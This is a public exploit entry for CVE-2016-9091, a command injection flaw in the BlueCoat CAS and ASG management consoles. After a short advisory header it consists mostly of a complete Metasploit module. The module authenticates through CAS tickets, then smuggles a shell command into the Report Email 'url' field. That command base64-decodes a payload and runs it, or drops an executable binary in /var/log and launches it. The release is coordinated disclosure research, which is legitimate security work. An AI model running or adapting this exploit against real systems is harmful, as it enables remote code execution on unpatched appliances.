# Exploit Title: OS Command Injection Vulnerability in BlueCoat ASG and CAS
# Date: April 3, 2017
# Exploit Authors:  Chris Hebert, Peter Paccione and Corey Boyd
# Contact: chrisdhebert[at]gmail.com
# Vendor Security Advisory: https://bto.bluecoat.com/security-advisory/sa138
# Version: CAS 1.3 prior to 1.3.7.4 & ASG 6.6 prior to 6.6.5.4 are vulnerable
# Tested on: BlueCoat CAS 1.3.7.1
# CVE : cve-2016-9091

Timeline:
--------
08/31/2016 (Vulnerablities Discovered)
03/31/2017 (Final Vendor Patch Confirmed)
04/03/2017 (Public Release)

Description:
The BlueCoat ASG and CAS management consoles are susceptible to an OS command injection vulnerability.
An authenticated malicious administrator can execute arbitrary OS commands with the privileges of the tomcat user.

Proof of Concept:

Metasploit Module - Remote Command Injection (via Report Email)
-----------------

##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "BlueCoat CAS 1.3.7.1 \"Report Email\" Command Injection",
      'Description'    => %q{
        BlueCoat CAS 1.3.7.1 (and possibly previous versions) are susceptible to an authenticated Remote Command Injection attack against
        the Report Email functionality.  This module exploits the vulnerability, resulting in tomcat execute permissions.
        Any authenticated user within the 'administrator' group is able to exploit this; however, a user within the 'Readonly' group cannot.
      },
      'License'        => MSF_LICENSE,
      'Author'       => [
         'Chris Hebert <chrisdhebert[at]gmail.com>',
         'Pete Paccione <petepaccione[at]gmail.com>',
         'Corey Boyd <corey.k.boyd[at]gmail.com>'
      ],
      'DisclosureDate' => 'Vendor Contacted 8-31-2016',
      'Platform'      => %w{ linux unix },
      'Targets'        =>
        [
          ['BlueCoat CAS 1.3.7.1', {}],
        ],
      'DefaultTarget'  => 0,

      'Arch'          => [ ARCH_X86, ARCH_X64, ARCH_CMD ],   
      'SessionTypes'  => [ 'shell', 'meterpreter' ],  
      'Payload'       =>
         {
           'BadChars' => '',
           'Compat'   =>
             {
               #'PayloadType' => 'cmd python cmd_bash cmd_interact',   
               #'RequiredCmd' => 'generic perl python openssl bash awk',   # metasploit may need to fix [bash,awk]
             }
         },
      'References'     =>
        [
          ['CVE', '2016-9091'],
          ['EDB', '##TBD##'],
          ['URL', 'https://bto.bluecoat.com/security-advisory/sa138']
        ],
      'DefaultOptions'  =>
        {
          'SSL' => true
        },
      'Privileged'     => true))

      register_options([
        Opt::RPORT(8082),
        OptString.new('USERNAME', [ true, 'Single username' ]),
        OptString.new('PASSWORD', [ true, 'Single password' ])
      ], self.class)
  end

  #Check BlueCoat CAS version - unauthenticated via GET /avenger/rest/version
  def check
    res = send_request_raw({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'avenger', 'rest', 'version')
    })

    clp_version = res.body.split("\<\/serialNumber\>\<version\>")
    clp_version = clp_version[1]
    clp_version = clp_version.split("\<")
    clp_version = clp_version[0]
    if res and clp_version != "1.3.7.1"
      print_status("#{peer} - ERROR - BlueCoat version #{clp_version}, but must be 1.3.7.1")
      fail_with(Failure::NotVulnerable, "BlueCoat version #{clp_version}, but must be 1.3.7.1")
    end
    return Exploit::CheckCode::Vulnerable
  end
  def exploit
    print_status("#{peer} - Checking for vulnerable BlueCoat Host...")
    if check != CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, "FAILED Exploit - BlueCoat not version 1.3.7.1")
    end

    print_status("#{peer} - Running Exploit...")
    post = {
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD']
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cas', 'v1', 'tickets'),
      'method' => 'POST',
      'vars_post' => post
    })

    unless res && res.code == 201
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    redirect = res.headers['Location']
    ticket1 = redirect.split("\/tickets\/").last
    print_status("#{peer} - Step 1 - REQ:Login -> RES:Ticket1 -> #{ticket1}")

    post = {
      'service' => 'http://localhost:8447/avenger/j_spring_cas_security_check'
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cas', 'v1', 'tickets', "#{ticket1}"),
      'method' => 'POST',
      'vars_post' => post
    })

    ticket2 = res.body
    print_status("#{peer} - Step 2 - REQ:Ticket1 -> RES:Ticket2 -> #{ticket2}")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "avenger/j_spring_cas_security_check?dc=1472496573838&ticket=#{ticket2}")
    })

    unless res && res.code == 302
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end
    cookie = res.get_cookies
    print_status("#{peer} - Step 3 - REQ:Ticket2 -> RES:COOKIE -> #{cookie}")

    if cookie.blank?
      print_error("#{peer} - Could not retrieve a cookie")
      return
    end

    unless res && res.code == 302
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    cookie = res.get_cookies

    if cookie.blank?
      print_error("#{peer} - Could not retrieve the authenticated cookie")
      return
    end

    print_status("#{peer} - LOGIN Process Complete ...")
    print_status("#{peer} - Exploiting Bluecoat CAS v1.3.7.1 - Report Email ...")


    if payload.raw.include?("perl") || payload.raw.include?("python") || payload.raw.include?("openssl")
      #print_status("#{peer} - DEBUG: asci payload (perl,python, openssl,?bash,awk ")
      post = "{\"reportType\":\"jpg\",\"url\":\"http\:\/\/localhost:8447/dev-report-overview.html\;echo #{Rex::Text.encode_base64(payload.raw)}|base64 -d|sh;\",\"subject\":\"CAS #{datastore["RHOST"]}: CAS Overview Report\"}"
    else
      #print_status("#{peer} - DEBUG - binary payload (meterpreter,etc, !!")
      post = "{\"reportType\":\"jpg\",\"url\":\"http\:\/\/localhost:8447/dev-report-overview.html\;echo #{Rex::Text.encode_base64(payload.raw)}|base64 -d>/var/log/metasploit.bin;chmod +x /var/log/metasploit.bin;/var/log/metasploit.bin;\",\"subject\":\"CAS #{datastore["RHOST"]}: CAS Overview Report\"}"
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'avenger', 'rest', 'report-email', 'send'),
      'method' => 'POST',
      'cookie' => cookie,
      'ctype' => 'application/json',
      'data' => post
    })
    print_status("#{peer} - Payload sent ...") 
  end

end

